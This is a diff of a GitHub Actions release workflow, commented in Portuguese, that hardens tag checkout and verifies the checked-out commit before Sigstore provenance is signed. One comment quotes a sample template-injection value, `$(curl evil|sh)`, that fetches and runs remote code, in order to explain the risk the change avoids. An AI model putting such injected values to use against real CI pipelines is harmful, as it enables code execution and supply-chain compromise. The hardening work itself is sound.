@@ -45,8 +45,13 @@ jobs:
           # actions/checkout aceita branch/tag/SHA por igual, por isso um
           # texto trocado no input (nome de branch, SHA) resolvia
           # silenciosamente para a ref errada em vez de falhar — com o
-          # prefixo, só resolve se for mesmo uma tag existente.
-          ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/tags/{0}', inputs.tag) || github.ref_name }}
+          # prefixo, só resolve se for mesmo uma tag existente. No push de tag
+          # usa-se `github.ref` (já `refs/tags/<tag>`), não `github.ref_name`:
+          # o nome nu é ambíguo e um branch com o mesmo nome da tag (qualquer
+          # escritor, incluindo apps que abrem branches) ganhava à tag no
+          # checkout, empacotando conteúdo que a proveniência assinada
+          # atribuiria ao commit da tag.
+          ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/tags/{0}', inputs.tag) || github.ref }}
           persist-credentials: false
 
       # A proveniência do Sigstore (actions/attest-build-provenance, mais
@@ -56,19 +61,20 @@ jobs:
       # no input, o conteúdo empacotado seria da tag e a proveniência
       # assinada descreveria main: incoerência sem deteção. Falha cedo se
       # isso acontecer, em vez de assinar uma proveniência errada.
-      - name: Confirmar tag == ref do run (workflow_dispatch)
-        if: github.event_name == 'workflow_dispatch'
+      - name: Confirmar que o checkout é o commit do run
+        # Em TODOS os triggers (antes só em workflow_dispatch): o conteúdo
+        # empacotado tem de ser o do commit que a proveniência descreve.
         # env, nunca ${{ }} direto no script: inputs.tag é texto livre
         # (workflow_dispatch), e interpolar diretamente no run: é injeção
         # de template (zizmor apanhou) — uma tag como `$(curl evil|sh)`
         # corria como shell antes de qualquer validação.
         env:
-          INPUT_TAG: ${{ inputs.tag }}
+          REF_LABEL: ${{ inputs.tag || github.ref_name }}
           RUN_SHA: ${{ github.sha }}
         run: |
           checked_out="$(git rev-parse HEAD)"
           if [ "$checked_out" != "$RUN_SHA" ]; then
-            echo "::error::A tag $INPUT_TAG (commit $checked_out) não corresponde ao commit em que este workflow foi corrido ($RUN_SHA). A proveniência Sigstore descreveria o commit errado. Corre de novo escolhendo a própria tag em 'Use workflow from'."
+            echo "::error::A tag $REF_LABEL (commit $checked_out) não corresponde ao commit em que este workflow foi corrido ($RUN_SHA). A proveniência Sigstore descreveria o commit errado. Corre de novo escolhendo a própria tag em 'Use workflow from'."
             exit 1
           fi
 
